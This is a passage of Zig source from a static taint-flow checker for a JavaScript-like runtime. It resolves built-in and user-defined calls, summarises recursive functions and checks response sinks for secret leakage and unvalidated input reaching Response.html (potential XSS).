        var matched: ?NodeIndex = null;
        var i: u16 = 0;
        while (i < obj.properties_count) : (i += 1) {
            const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
            if (self.ir_view.getTag(prop_idx) != .object_property) return self.unresolvedCallLabels(LabelSet.empty);
            const prop = self.ir_view.getProperty(prop_idx) orelse return self.unresolvedCallLabels(LabelSet.empty);
            const key = self.getObjectPropertyKey(prop.key) orelse return self.unresolvedCallLabels(LabelSet.empty);
            if (!std.mem.eql(u8, key, method)) continue;
            if (matched != null) return self.unresolvedCallLabels(LabelSet.empty);
            matched = self.resolveFunctionNode(prop.value) orelse return self.unresolvedCallLabels(LabelSet.empty);
        }
        const fn_node = matched orelse return self.unresolvedCallLabels(LabelSet.empty);
        return self.resolvedFunctionCallLabels(fn_node, call_data);
    }

    fn getObjectPropertyKey(self: *const FlowChecker, node: NodeIndex) ?[]const u8 {
        const tag = self.ir_view.getTag(node) orelse return null;
        return switch (tag) {
            .identifier => blk: {
                const binding = self.bindingAt(node) orelse break :blk null;
                break :blk self.resolveAtomName(binding.name_atom);
            },
            .lit_string => blk: {
                const string_idx = self.ir_view.getStringIdx(node) orelse break :blk null;
                break :blk self.ir_view.getString(string_idx);
            },
            // exhaustive: a dynamic key makes literal-method resolution fail,
            // which routes the call through the `.unknown` fallback.
            else => null,
        };
    }

    const BuiltinReceiverKind = enum {
        global_array,
        global_console,
        global_date,
        global_json,
        global_math,
        global_number,
        global_object,
        global_response,
        global_string,
        string,
        array,
        response,
        headers,
        result,
    };

    fn isKnownBuiltinMemberCall(self: *const FlowChecker, callee: NodeIndex) bool {
        const tag = self.ir_view.getTag(callee) orelse return false;
        if (tag != .member_access and tag != .optional_chain) return false;
        const member = self.ir_view.getMember(callee) orelse return false;
        const method = self.resolveAtomName(member.property) orelse return false;
        const kind = self.builtinReceiverKind(member.object, 0) orelse return false;
        return switch (kind) {
            .global_array => std.mem.eql(u8, method, "isArray") or std.mem.eql(u8, method, "from") or std.mem.eql(u8, method, "of"),
            .global_console => std.mem.eql(u8, method, "log") or std.mem.eql(u8, method, "warn") or std.mem.eql(u8, method, "error"),
            .global_date => std.mem.eql(u8, method, "now"),
            .global_json => std.mem.eql(u8, method, "parse") or std.mem.eql(u8, method, "tryParse") or std.mem.eql(u8, method, "stringify"),
            .global_math => isMathMethod(method),
            .global_number => std.mem.eql(u8, method, "isInteger") or std.mem.eql(u8, method, "isNaN") or std.mem.eql(u8, method, "isFinite") or std.mem.eql(u8, method, "parseFloat") or std.mem.eql(u8, method, "parseInt"),
            .global_object => std.mem.eql(u8, method, "keys") or std.mem.eql(u8, method, "values") or std.mem.eql(u8, method, "entries") or std.mem.eql(u8, method, "hasOwn"),
            .global_response => std.mem.eql(u8, method, "json") or std.mem.eql(u8, method, "text") or std.mem.eql(u8, method, "html") or std.mem.eql(u8, method, "redirect") or std.mem.eql(u8, method, "rawJson"),
            .global_string => std.mem.eql(u8, method, "fromCharCode"),
            .string => isStringMethod(method),
            .array => isArrayMethod(method),
            .response => std.mem.eql(u8, method, "json") or std.mem.eql(u8, method, "text"),
            .headers => std.mem.eql(u8, method, "get"),
            .result => isResultMethod(method),
        };
    }

    fn builtinReceiverKind(self: *const FlowChecker, node: NodeIndex, depth: u8) ?BuiltinReceiverKind {
        if (depth >= max_summary_depth) return null;
        const tag = self.ir_view.getTag(node) orelse return null;
        switch (tag) {
            .lit_string => return .string,
            .array_literal => return .array,
            .identifier => {
                const binding = self.bindingAt(node) orelse return null;
                if (binding.kind == .undeclared_global) {
                    const name = self.resolveAtomName(binding.name_atom) orelse return null;
                    return globalReceiverKind(name);
                }
                if (binding.kind == .argument) {
                    if (self.bindingIsMutated(binding)) return null;
                    const kind = self.checkedBuiltinReceiverKind(node) orelse return null;
                    if (kind != .string and (self.bindingHasAlias(binding) or
                        self.bindingEscapesStableResolution(binding)))
                    {
                        return null;
                    }
                    return kind;
                }
                const decl = self.findBindingDecl(binding) orelse return null;
                if (self.bindingIsMutated(binding)) return null;
                const kind = self.builtinReceiverKind(decl.init, depth + 1) orelse return null;
                if (kind != .string and (self.bindingHasAlias(binding) or
                    self.bindingEscapesStableResolution(binding)))
                {
                    return null;
                }
                return kind;
            },
            .call, .method_call => {
                const call = self.ir_view.getCall(node) orelse return null;
                if (self.ir_view.getTag(call.callee) == .identifier) {
                    const binding = self.bindingAt(call.callee) orelse return null;
                    if (binding.kind == .undeclared_global) {
                        const name = self.resolveAtomName(binding.name_atom) orelse return null;
                        if (std.mem.eql(u8, name, "String")) return .string;
                        if (std.mem.eql(u8, name, "Array") or std.mem.eql(u8, name, "range")) return .array;
                        return null;
                    }
                    if (self.module_fn_meta.get(binding.slot)) |meta| {
                        if (meta.returns == .string or meta.returns == .optional_string) return .string;
                        if (meta.returns == .result) return .result;
                        if ((std.mem.eql(u8, meta.module, "fetch") and
                            (std.mem.eql(u8, meta.func, "fetch") or std.mem.eql(u8, meta.func, "fetchWithRetry"))) or
                            (std.mem.eql(u8, meta.module, "service") and std.mem.eql(u8, meta.func, "serviceCall")) or
                            (std.mem.eql(u8, meta.module, "workflow") and
                                (std.mem.eql(u8, meta.func, "call") or std.mem.eql(u8, meta.func, "follow"))) or
                            (std.mem.eql(u8, meta.module, "io") and std.mem.eql(u8, meta.func, "race"))) return .response;
                    }
                }
                if (self.ir_view.getTag(call.callee) != .member_access) return null;
                const member = self.ir_view.getMember(call.callee) orelse return null;
                const method = self.resolveAtomName(member.property) orelse return null;
                const receiver = self.builtinReceiverKind(member.object, depth + 1) orelse return null;
                return builtinMethodResult(receiver, method);
            },
            .member_access, .optional_chain => {
                const member = self.ir_view.getMember(node) orelse return null;
                const name = self.resolveAtomName(member.property) orelse return null;
                if (std.mem.eql(u8, name, "headers") and self.isReqBinding(member.object)) return .headers;
                if ((std.mem.eql(u8, name, "body") or std.mem.eql(u8, name, "url") or std.mem.eql(u8, name, "method") or
                    std.mem.eql(u8, name, "subject") or std.mem.eql(u8, name, "tenant")) and
                    self.isReqBinding(member.object)) return .string;
                if (std.mem.eql(u8, name, "headers")) {
                    const object_kind = self.builtinReceiverKind(member.object, depth + 1) orelse return null;
                    if (object_kind == .response) return .headers;
                }
                return null;
            },
            .binary_op => {
                const binary = self.ir_view.getBinary(node) orelse return null;
                if (binary.op != .nullish) return null;
                const left_kind = self.builtinReceiverKind(binary.left, depth + 1) orelse return null;
                const right_kind = self.builtinReceiverKind(binary.right, depth + 1) orelse return null;
                return if (left_kind == right_kind) left_kind else null;
            },
            .ternary => {
                const ternary = self.ir_view.getTernary(node) orelse return null;
                const then_kind = self.builtinReceiverKind(ternary.then_branch, depth + 1) orelse return null;
                const else_kind = self.builtinReceiverKind(ternary.else_branch, depth + 1) orelse return null;
                return if (then_kind == else_kind) then_kind else null;
            },
            // exhaustive: no other expression proves an intrinsic receiver;
            // null makes its member call carry `.unknown`.
            else => return null,
        }
    }

    fn checkedBuiltinReceiverKind(self: *const FlowChecker, node: NodeIndex) ?BuiltinReceiverKind {
        const checker = self.type_checker orelse return null;
        const type_idx = checker.inferTypeWithoutDiagnostics(node);
        return switch (checker.env.pool.getTag(type_idx) orelse return null) {
            .t_string, .t_literal_string, .t_template_literal => .string,
            .t_array, .t_tuple => .array,
            // exhaustive: records, functions, unknown types, and all other
            // types do not prove a primitive or array receiver. Keep their
            // method calls unresolved so the fallback retains `.unknown`.
            else => null,
        };
    }

    fn isStringMethod(name: []const u8) bool {
        return std.mem.eql(u8, name, "charAt") or
            std.mem.eql(u8, name, "charCodeAt") or
            std.mem.eql(u8, name, "indexOf") or
            std.mem.eql(u8, name, "lastIndexOf") or
            std.mem.eql(u8, name, "startsWith") or
            std.mem.eql(u8, name, "endsWith") or
            std.mem.eql(u8, name, "includes") or
            std.mem.eql(u8, name, "slice") or
            std.mem.eql(u8, name, "substring") or
            std.mem.eql(u8, name, "toLowerCase") or
            std.mem.eql(u8, name, "toUpperCase") or
            std.mem.eql(u8, name, "trim") or
            std.mem.eql(u8, name, "trimStart") or
            std.mem.eql(u8, name, "trimEnd") or
            std.mem.eql(u8, name, "split") or
            std.mem.eql(u8, name, "repeat") or
            std.mem.eql(u8, name, "padStart") or
            std.mem.eql(u8, name, "padEnd") or
            std.mem.eql(u8, name, "concat") or
            std.mem.eql(u8, name, "replace") or
            std.mem.eql(u8, name, "replaceAll");
    }

    fn isArrayMethod(name: []const u8) bool {
        const methods = [_][]const u8{
            "push",  "pop",       "shift",    "unshift",    "splice", "indexOf", "includes", "join",
            "slice", "concat",    "map",      "filter",     "reduce", "forEach", "every",    "some",
            "find",  "findIndex", "toSorted", "toReversed",
        };
        for (methods) |method| {
            if (std.mem.eql(u8, name, method)) return true;
        }
        return false;
    }

    fn builtinMethodResult(receiver: BuiltinReceiverKind, method: []const u8) ?BuiltinReceiverKind {
        return switch (receiver) {
            .global_json => if (std.mem.eql(u8, method, "stringify")) .string else null,
            .global_object => if (std.mem.eql(u8, method, "keys") or std.mem.eql(u8, method, "values") or std.mem.eql(u8, method, "entries")) .array else null,
            .global_response => if (std.mem.eql(u8, method, "json") or std.mem.eql(u8, method, "text") or std.mem.eql(u8, method, "html") or std.mem.eql(u8, method, "redirect") or std.mem.eql(u8, method, "rawJson")) .response else null,
            .global_string => if (std.mem.eql(u8, method, "fromCharCode")) .string else null,
            .global_array => if (std.mem.eql(u8, method, "from") or std.mem.eql(u8, method, "of")) .array else null,
            .global_console, .global_date, .global_math, .global_number => null,
            .string => if (std.mem.eql(u8, method, "split")) .array else if (std.mem.eql(u8, method, "charAt") or
                std.mem.eql(u8, method, "slice") or
                std.mem.eql(u8, method, "substring") or
                std.mem.eql(u8, method, "toLowerCase") or
                std.mem.eql(u8, method, "toUpperCase") or
                std.mem.eql(u8, method, "trim") or
                std.mem.eql(u8, method, "trimStart") or
                std.mem.eql(u8, method, "trimEnd") or
                std.mem.eql(u8, method, "repeat") or
                std.mem.eql(u8, method, "padStart") or
                std.mem.eql(u8, method, "padEnd") or
                std.mem.eql(u8, method, "concat") or
                std.mem.eql(u8, method, "replace") or
                std.mem.eql(u8, method, "replaceAll")) .string else null,
            .array => if (std.mem.eql(u8, method, "join")) .string else if (std.mem.eql(u8, method, "slice") or
                std.mem.eql(u8, method, "concat") or
                std.mem.eql(u8, method, "map") or
                std.mem.eql(u8, method, "filter") or
                std.mem.eql(u8, method, "splice") or
                std.mem.eql(u8, method, "toSorted") or
                std.mem.eql(u8, method, "toReversed")) .array else null,
            .response => if (std.mem.eql(u8, method, "text")) .string else null,
            .headers => if (std.mem.eql(u8, method, "get")) .string else null,
            .result => if (std.mem.eql(u8, method, "map") or std.mem.eql(u8, method, "mapErr") or
                std.mem.eql(u8, method, "andThen") or std.mem.eql(u8, method, "orElse")) .result else null,
        };
    }

    fn globalReceiverKind(name: []const u8) ?BuiltinReceiverKind {
        if (std.mem.eql(u8, name, "Array")) return .global_array;
        if (std.mem.eql(u8, name, "console")) return .global_console;
        if (std.mem.eql(u8, name, "Date") or std.mem.eql(u8, name, "performance")) return .global_date;
        if (std.mem.eql(u8, name, "JSON")) return .global_json;
        if (std.mem.eql(u8, name, "Math")) return .global_math;
        if (std.mem.eql(u8, name, "Number")) return .global_number;
        if (std.mem.eql(u8, name, "Object")) return .global_object;
        if (std.mem.eql(u8, name, "Response")) return .global_response;
        if (std.mem.eql(u8, name, "String")) return .global_string;
        return null;
    }

    fn isMathMethod(name: []const u8) bool {
        const methods = [_][]const u8{
            "abs", "floor", "ceil", "round", "min", "max",    "pow", "trunc", "sqrt",
            "sin", "cos",   "tan",  "log",   "exp", "random",
        };
        for (methods) |method| {
            if (std.mem.eql(u8, name, method)) return true;
        }
        return false;
    }

    fn isResultMethod(name: []const u8) bool {
        return std.mem.eql(u8, name, "isOk") or
            std.mem.eql(u8, name, "isErr") or
            std.mem.eql(u8, name, "unwrap") or
            std.mem.eql(u8, name, "unwrapOr") or
            std.mem.eql(u8, name, "unwrapErr") or
            std.mem.eql(u8, name, "map") or
            std.mem.eql(u8, name, "mapErr") or
            std.mem.eql(u8, name, "andThen") or
            std.mem.eql(u8, name, "orElse") or
            std.mem.eql(u8, name, "match");
    }

    /// True for `req.headers.get("authorization")` (case-insensitive header
    /// name): callee is `req.headers.get` and the first argument is the literal
    /// "authorization".
    fn isAuthHeaderGet(self: *const FlowChecker, call_data: Node.CallExpr) bool {
        const member = self.ir_view.getMember(call_data.callee) orelse return false;
        const prop_name = self.resolveAtomName(member.property) orelse return false;
        if (!std.mem.eql(u8, prop_name, "get")) return false;
        if (self.carrierKind(member.object) != .headers) return false;
        if (call_data.args_count == 0) return false;
        const arg = self.ir_view.getListIndex(call_data.args_start, 0);
        if (self.ir_view.getTag(arg) != .lit_string) return false;
        const str_idx = self.ir_view.getStringIdx(arg) orelse return false;
        const key = self.ir_view.getString(str_idx) orelse return false;
        return std.ascii.eqlIgnoreCase(key, "authorization");
    }

    /// Labels for a call to a user-defined function: seed the callee's
    /// parameters with the argument labels, walk its body (its expression sinks
    /// report the labels this call passes in), and union the labels of every
    /// return value. A call the walk cannot enter returns the union of the
    /// argument labels with `.unknown` and clears the properties that a sink
    /// decides (`unresolvedCallLabels`).
    fn userCallLabels(self: *FlowChecker, binding: ir.BindingRef, call_data: Node.CallExpr) LabelSet {
        var arg_labels: [max_summary_params]LabelSet = @splat(LabelSet.empty);
        var arg_union = LabelSet.empty;
        for (0..call_data.args_count) |i| {
            const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
            const labels = self.inferLabels(arg);
            if (i < max_summary_params) arg_labels[i] = labels;
            arg_union = LabelSet.merge(arg_union, labels);
        }

        // Every exit below that does not read the callee's body returns the
        // argument union plus `.unknown`, and clears what a sink decides. The
        // argument union alone is the empty set for a zero-argument call, and
        // the empty set is the positive claim that the value carries nothing. A
        // secret returned by a helper the walk could not enter would reach a
        // sink unlabelled and falsely discharge no_secret_leakage. `.unknown`
        // covers a result that reaches a sink, and the cleared properties
        // cover a result that is discarded, because the unwalked body can hold
        // a sink that this call site never reaches.
        const fn_key = packBindingKey(binding.scope_id, binding.slot);
        if (self.bindingIsMutated(binding)) return self.unresolvedCallLabels(arg_union);
        // A parameter that the call site being summarized bound to a function
        // resolves to that function, like a declaration.
        const fn_node = self.user_fn_decls.get(fn_key) orelse self.param_values.get(fn_key) orelse {
            // An implicit global is a builtin - `h`, `range`, `renderToString`
            // - whose body is not in this module to walk and which launders
            // nothing on its own. Any other binding without a declaration is a
            // call through a value: a callback parameter, or an import the
            // resolver did not follow.
            if (binding.kind == .undeclared_global) {
                const name = self.resolveAtomName(binding.name_atom) orelse return self.unresolvedCallLabels(arg_union);
                if (known_globals.isKnownGlobalFunction(name)) return arg_union;
                // `fetchSync` is the ambient egress global: a native with no
                // body to walk, whose sink `checkEgressCall` evaluates at the
                // call. Its value is still unknown.
                if (std.mem.eql(u8, name, "fetchSync")) return LabelSet.merge(arg_union, .{ .unknown = true });
                return self.unresolvedCallLabels(arg_union);
            }
            // A function imported from another file, whose return labels the
            // caller computed from that file and installed here. Unioned with
            // the arguments rather than replacing them, because those labels
            // were computed with the parameters left unlabelled. Unit F7
            // covers the sinks inside it.
            if (self.file_fn_labels.get(binding.slot)) |imported| {
                return LabelSet.merge(arg_union, imported);
            }
            return self.unresolvedCallLabels(arg_union);
        };
        return self.functionCallLabels(fn_node, call_data, arg_labels, arg_union);
    }

    fn resolvedFunctionCallLabels(self: *FlowChecker, fn_node: NodeIndex, call_data: Node.CallExpr) LabelSet {
        var arg_labels: [max_summary_params]LabelSet = @splat(LabelSet.empty);
        var arg_union = LabelSet.empty;
        for (0..call_data.args_count) |i| {
            const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
            const labels = self.inferLabels(arg);
            if (i < max_summary_params) arg_labels[i] = labels;
            arg_union = LabelSet.merge(arg_union, labels);
        }
        return self.functionCallLabels(fn_node, call_data, arg_labels, arg_union);
    }

    /// The function or object literal that a call-site argument stands for, or
    /// null when it is neither. A closure or object literal written at the call
    /// site stands for itself. A name stands for the declaration it is bound
    /// to, or for what the enclosing summary frame bound it to when it is a
    /// parameter that the caller passed on.
    fn passedValueNode(self: *const FlowChecker, arg: NodeIndex) ?NodeIndex {
        const tag = self.ir_view.getTag(arg) orelse return null;
        switch (tag) {
            .function_expr, .arrow_function, .object_literal => return arg,
            .identifier => {
                const binding = self.bindingAt(arg) orelse return null;
                const key = packBindingKey(binding.scope_id, binding.slot);
                if (self.param_values.get(key)) |passed| {
                    if (self.bindingIsMutated(binding)) return null;
                    return passed;
                }
                if (self.user_fn_decls.get(key)) |declared| {
                    if (self.bindingIsMutated(binding)) return null;
                    return declared;
                }
                return self.resolveLiteralObjectMethod(arg);
            },
            // exhaustive: any other expression is not a statically resolved
            // function or object value, so a parameter bound to it stays
            // unresolved and a call through it fails closed.
            else => return null,
        }
    }

    fn functionCallLabels(
        self: *FlowChecker,
        fn_node: NodeIndex,
        call_data: Node.CallExpr,
        arg_labels: [max_summary_params]LabelSet,
        arg_union: LabelSet,
    ) LabelSet {
        if (self.summary_depth >= max_summary_depth) return self.unresolvedCallLabels(arg_union);
        for (self.summary_stack[0..self.summary_depth], 0..) |active, frame| {
            if (active == fn_node) return self.recursiveCallLabels(frame, fn_node, call_data, arg_labels, arg_union);
        }
        const func = self.ir_view.getFunction(fn_node) orelse return self.unresolvedCallLabels(arg_union);
        // Past the parameter cap the arguments cannot be bound, so the body
        // would read every parameter as unlabelled and launder its arguments.
        if (func.params_count > max_summary_params) return self.unresolvedCallLabels(arg_union);

        // Read what the call site passes before any binding changes, because a
        // pass-through argument is resolved against the enclosing frame's
        // bindings.
        const param_count: usize = func.params_count;
        var passed: [max_summary_params]?NodeIndex = @splat(null);
        var saved: [max_summary_params]?NodeIndex = @splat(null);
        var keys: [max_summary_params]?u32 = @splat(null);
        // Whether each argument is the request or its headers, read with the
        // same pass-through rule: a parameter that the call site bound to the
        // request makes the callee's reads of `authorization` credentials.
        var carriers: [max_summary_params]?CarrierKind = @splat(null);
        var saved_carriers: [max_summary_params]?CarrierKind = @splat(null);
        for (0..param_count) |i| {
            const param_idx = self.ir_view.getListIndex(func.params_start, @intCast(i));
            const pb = self.paramBinding(param_idx) orelse continue;
            const key = packBindingKey(pb.scope_id, pb.slot);
            keys[i] = key;
            saved[i] = self.param_values.get(key);
            saved_carriers[i] = self.request_carriers.get(key);
            if (i < call_data.args_count) {
                const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
                passed[i] = self.passedValueNode(arg);
                carriers[i] = self.carrierKind(arg);
            }
        }
        // A binding made for this call site ends with its frame.
        defer self.restoreParamValues(&keys, &saved);
        defer self.restoreCarriers(&keys, &saved_carriers);

        for (0..param_count) |i| {
            const key = keys[i] orelse continue;
            const labels = if (i < call_data.args_count) arg_labels[i] else LabelSet.empty;
            self.binding_labels.put(self.allocator, key, labels) catch {
                self.markAllocationFailure();
                return self.unresolvedCallLabels(arg_union);
            };
            if (passed[i]) |value| {
                self.param_values.put(self.allocator, key, value) catch {
                    self.markAllocationFailure();
                    return self.unresolvedCallLabels(arg_union);
                };
            } else {
                _ = self.param_values.remove(key);
            }
            self.setCarrier(key, carriers[i]);
        }

        const frame = self.summary_depth;
        self.pushSummaryFrame(fn_node, true);
        defer self.summary_depth -= 1;

        var returned = self.summaryBodyLabels(func) orelse return self.unresolvedCallLabels(arg_union);
        // A recursive call widened the labels this frame's parameters can
        // carry, so the body is walked again with the wider labels, until no
        // recursive call widens them further. The label set is a fixed set of
        // flags and each pass adds one, so this ends; the bound is a guard
        // that fails closed if the reasoning is ever wrong.
        var passes: u8 = 0;
        while (self.summary_widened[frame]) {
            self.summary_widened[frame] = false;
            passes += 1;
            if (passes > max_fixpoint_passes) return self.unresolvedCallLabels(arg_union);
            for (0..param_count) |i| {
                const key = keys[i] orelse continue;
                self.binding_labels.put(self.allocator, key, self.summary_bound[frame][i]) catch {
                    self.markAllocationFailure();
                    return self.unresolvedCallLabels(arg_union);
                };
            }
            const again = self.summaryBodyLabels(func) orelse return self.unresolvedCallLabels(arg_union);
            returned = LabelSet.merge(returned, again);
        }
        return returned;
    }

    /// Put each parameter's `param_values` entry back to what it was before the
    /// frame bound it.
    fn restoreParamValues(
        self: *FlowChecker,
        keys: *const [max_summary_params]?u32,
        saved: *const [max_summary_params]?NodeIndex,
    ) void {
        for (keys, saved) |maybe_key, previous| {
            const key = maybe_key orelse continue;
            if (previous) |value| {
                self.param_values.put(self.allocator, key, value) catch self.markAllocationFailure();
            } else {
                _ = self.param_values.remove(key);
            }
        }
    }

    /// Put each parameter's carrier record back to what it was before the
    /// frame bound it.
    fn restoreCarriers(
        self: *FlowChecker,
        keys: *const [max_summary_params]?u32,
        saved: *const [max_summary_params]?CarrierKind,
    ) void {
        for (keys, saved) |maybe_key, previous| {
            const key = maybe_key orelse continue;
            self.setCarrier(key, previous);
        }
    }

    /// Walk a function body under a summary and return the union of its return
    /// labels. Null when the body has no recognizable shape.
    fn summaryBodyLabels(self: *FlowChecker, func: Node.FunctionExpr) ?LabelSet {
        const body_tag = self.ir_view.getTag(func.body) orelse return null;
        // A concise arrow body (`(x) => x`) is stored as a `.return_stmt`
        // wrapping the expression, not the bare expression, so it must go
        // through the same returns-collector as a block/program body. Routing
        // it to the `inferLabels(func.body)` fallback below would infer labels
        // on the return_stmt node (unhandled -> empty), laundering any taint
        // through a const-bound arrow wrapper and falsely proving
        // no_secret_leakage.
        if (body_tag == .block or body_tag == .program or body_tag == .return_stmt) {
            var collected = LabelSet.empty;
            const saved = self.summary_returns;
            self.summary_returns = &collected;
            defer self.summary_returns = saved;
            self.walkStmt(func.body);
            return collected;
        }
        // Arrow expression body: the body is the return expression.
        return self.exprBodyLabels(func.body);
    }

    /// A call to a function that is already on the summary stack. The active
    /// frame collects every return of the function, so the call itself
    /// contributes its argument union. What the call can still add is a wider
    /// label on a parameter: a secret that enters only in the recursive call's
    /// argument reaches the base case's sink in the next recursion level. The
    /// call widens the frame's bound labels and marks the frame, and the
    /// frame's owner walks the body again with them.
    fn recursiveCallLabels(
        self: *FlowChecker,
        frame: usize,
        fn_node: NodeIndex,
        call_data: Node.CallExpr,
        arg_labels: [max_summary_params]LabelSet,
        arg_union: LabelSet,
    ) LabelSet {
        const func = self.ir_view.getFunction(fn_node) orelse return self.unresolvedCallLabels(arg_union);
        if (func.params_count > max_summary_params) return self.unresolvedCallLabels(arg_union);

        var widened = false;
        for (0..func.params_count) |i| {
            const param_idx = self.ir_view.getListIndex(func.params_start, @intCast(i));
            const pb = self.paramBinding(param_idx) orelse continue;

            // A different function or object passed for a parameter than the
            // frame resolved it to: the body walked for the frame would not be
            // the body this call runs.
            const key = packBindingKey(pb.scope_id, pb.slot);
            const passed: ?NodeIndex = if (i < call_data.args_count)
                self.passedValueNode(self.ir_view.getListIndex(call_data.args_start, @intCast(i)))
            else
                null;
            if (passed != self.param_values.get(key)) return self.unresolvedCallLabels(arg_union);

            const incoming = if (i < call_data.args_count) arg_labels[i] else LabelSet.empty;
            const bound = self.summary_bound[frame][i];
            const merged = LabelSet.mergeConditional(bound, incoming);
            if (@as(u16, @bitCast(merged)) == @as(u16, @bitCast(bound))) continue;
            // Only the owner of a `functionCallLabels` frame walks it again. A
            // frame of any other kind has nobody to run the wider labels.
            if (!self.summary_rewalks[frame]) return self.unresolvedCallLabels(arg_union);
            self.summary_bound[frame][i] = merged;
            widened = true;
        }
        if (widened) self.summary_widened[frame] = true;
        return arg_union;
    }

    fn checkResponseSink(self: *FlowChecker, ret_val: NodeIndex) void {
        // The producers of an `unsafe_html` fact are those found while this
        // return value is evaluated.
        self.html_producers.clearRetainingCapacity();
        var visited: [response_resolve_limit]u32 = undefined;
        var visited_len: usize = 0;
        if (!self.checkResponseValue(ret_val, &visited, &visited_len)) {
            // No Response-helper call shape was reachable for this return
            // value; run a label-only response-sink check so taint cannot
            // ride out through a binding the resolver could not follow.
            self.checkSinkLabels(self.inferLabels(ret_val), ret_val, .response);
        }
    }

    /// Run the response-sink checks on a returned value, resolving through
    /// ternary arms and locally recorded binding values. Returns true when
    /// every reachable shape ended at a Response-helper call that was
    /// sink-checked; false tells the caller to fall back to a label-only
    /// check on the original return value.
    fn checkResponseValue(
        self: *FlowChecker,
        node: NodeIndex,
        visited: *[response_resolve_limit]u32,
        visited_len: *usize,
    ) bool {
        if (node == null_node) return false;
        const tag = self.ir_view.getTag(node) orelse return false;

        switch (tag) {
            // Response.json(data), Response.text(data), Response.html(data), Response.redirect(url)
            .method_call, .call => {
                const call_data = self.ir_view.getCall(node) orelse return false;
                if (!self.isResponseHelper(call_data.callee)) return false;

                // Only the first argument is sink-checked, and that matches
                // what leaves the process: `Response.json/text/html` read the
                // second argument for `status` alone (see `http.zig`), so a
                // value placed in `{ headers: ... }` is dropped rather than
                // transmitted. If those helpers ever honor custom headers, the
                // init argument becomes a response sink and has to be checked
                // here in the same change - otherwise a secret in a header
                // would discharge no_secret_leakage.
                if (call_data.args_count > 0) {
                    const data_arg = self.ir_view.getListIndex(call_data.args_start, 0);
                    const labels = self.inferLabels(data_arg);
                    self.checkSinkLabels(labels, node, .response);

                    // XSS check: Response.html with unvalidated user input
                    if (labels.has(.user_input) and !labels.has(.validated)) {
                        if (self.isGlobalMethodCall(call_data.callee, "Response", &.{"html"})) {
                            self.reportUnvalidatedHtml(node);
                        }
                    } else if (labels.has(.validated)) {
                        // Defended: a validated value safely reaches an HTML
                        // response. The `.validated` label is present only
                        // because the value passed a named validator (e.g.
                        // escapeHtml/validateObject), so the guard is real.
                        if (self.isGlobalMethodCall(call_data.callee, "Response", &.{"html"})) {
                            self.recordValidated(.injection_safe, data_arg, node, "an HTML response body");
                        }
                    }
                }
                return true;
            },

            .ternary => {
                const t = self.ir_view.getTernary(node) orelse return false;
                const then_covered = self.checkResponseValue(t.then_branch, visited, visited_len);
                const else_covered = self.checkResponseValue(t.else_branch, visited, visited_len);
                return then_covered and else_covered;
            },

            .identifier => {
                const binding = self.bindingAt(node) orelse return false;
                const key = packBindingKey(binding.scope_id, binding.slot);
                for (visited[0..visited_len.*]) |seen| {
                    if (seen == key) return true;
                }
                if (visited_len.* >= visited.len) return false;
                visited[visited_len.*] = key;
                visited_len.* += 1;

                const values = self.binding_value_nodes.get(key) orelse return false;
                if (values.items.len == 0) return false;
                var all_covered = true;
                for (values.items) |value| {
                    if (!self.checkResponseValue(value, visited, visited_len)) all_covered = false;
                }
                return all_covered;
            },

            // exhaustive: false means "this shape was not resolved to a
            // Response helper", which sends the caller to the label-only sink
            // check on the original value. Failing to resolve costs precision
            // in the diagnostic, never the check itself.
            else => return false,
        }
    }

    /// Report unvalidated user input reaching `Response.html` at `node`.
    /// Shared by the handler's response check and the summary-return check so
    /// the message and help stay one text.
    fn reportUnvalidatedHtml(self: *FlowChecker, node: NodeIndex) void {
        self.addDiagnostic(.{
            .severity = .warning,
            .kind = .unvalidated_input_in_egress,
            .node = node,
            .message = "unvalidated user input in Response.html (potential XSS)",
            .help = "use JSX with renderToString() for auto-escaping, or pass input through validateObject() first",
        });
        self.properties.injection_safe = false;
    }

    /// Mark the value of a `Response.html(x)` call as an HTML response built
    /// from unvalidated user input (plan unit F4). The mark is the
    /// `unsafe_html` fact in the label set, so it follows the value through
    /// every return, binding, ternary arm, argument, and field that the label
    /// walk follows, and it is reported only where the value reaches the
    /// handler's response (`checkSinkLabels`). A callee that builds HTML and
    /// whose caller discards it therefore reports nothing. Only the first
    /// argument is read, as at the handler's own response check.
    ///
    /// A route function that `check` also walks as a request root reports its
    /// own response in that walk, so a dispatch copy of it records no fact.
    fn withHtmlFact(self: *FlowChecker, node: NodeIndex, call_data: Node.CallExpr, labels: LabelSet) LabelSet {
        if (self.root_dispatch_depth > 0) return labels;
        if (call_data.args_count == 0) return labels;
        if (!self.isGlobalMethodCall(call_data.callee, "Response", &.{"html"})) return labels;
        const body = self.inferLabels(self.ir_view.getListIndex(call_data.args_start, 0));
        if (!body.has(.user_input) or body.has(.validated)) return labels;
        self.noteHtmlProducer(node);
        var marked = labels;
        marked.unsafe_html = true;
        return marked;
    }

    /// Remember the `Response.html` call that produced an `unsafe_html` fact
    /// during the evaluation now running, so that the response check can name
    /// it. `checkResponseSink` empties the list before it reads a return value.
    fn noteHtmlProducer(self: *FlowChecker, node: NodeIndex) void {
        if (std.mem.indexOfScalar(NodeIndex, self.html_producers.items, node) != null) return;
        self.html_producers.append(self.allocator, node) catch self.markAllocationFailure();
    }

    /// A value carrying the `unsafe_html` fact reached the response. Report at
    /// the `Response.html` calls that built it during this evaluation. A fact
    /// that a binding carried here from an earlier statement has no producer in
    /// the list, so the report goes to the sink node and the verdict is the
    /// same.
    fn reportUnsafeHtmlAtResponse(self: *FlowChecker, sink_node: NodeIndex) void {
        if (self.html_producers.items.len == 0) {
            self.reportUnvalidatedHtml(sink_node);
            return;
        }
        // Reporting appends no producer, so the list is stable while it is read.
        for (self.html_producers.items) |producer| self.reportUnvalidatedHtml(producer);
    }

    /// Check every sink call inside an expression (plan unit F5). A sink can
    /// sit anywhere an expression can: a statement, an initializer, a return
    /// value, a concise arrow body, a condition, or inside another expression
    /// as an array element, an object field, a ternary arm, or a call argument.
    /// `checkExprSinks` reads only the call it is given, so this walks the
    /// expression and gives it each call, inner calls first, which is the order
    /// the runtime evaluates them in. A function literal is not entered: its
    /// body runs when it is called, and the callee walks reach it there.
    fn scanExprSinks(self: *FlowChecker, node: NodeIndex) void {
        self.scanExprSinksAt(node, 0);
    }

    fn scanExprSinksAt(self: *FlowChecker, node: NodeIndex, depth: u16) void {
        if (node == null_node) return;
        // An expression nested deeper than any real program leaves part of
        // itself unread, and a sink in that part would be silent. The property
        // goes unproven instead.
